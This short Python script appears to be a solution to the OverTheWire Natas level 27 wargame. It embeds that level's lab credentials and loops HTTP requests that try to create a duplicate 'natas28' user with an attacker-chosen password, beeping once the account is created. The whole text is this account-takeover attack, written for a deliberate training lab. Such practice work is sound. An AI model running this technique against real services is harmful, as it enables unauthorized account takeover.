import requests
import winsound
target="http://natas27:55TBjpPZUUJgVP5b3BnbG6ON9uDPVzCJ@natas27.natas.labs.overthewire.org/index.php"
gotItStr="created"
r = requests.get(target)
if r.status_code != requests.codes.ok:
        print("cant connect")
        exit()
else:
        print('Target reachable. Starting crete dup user...')

targetAppend="/index.php?username=natas28&password=minenow"

i=0
while True:
    r = requests.get(target+targetAppend)
    print(i)
    i+=1
    if  gotItStr in str(r.content):
        print (r.content)
        winsound.Beep(300,2000)
        break
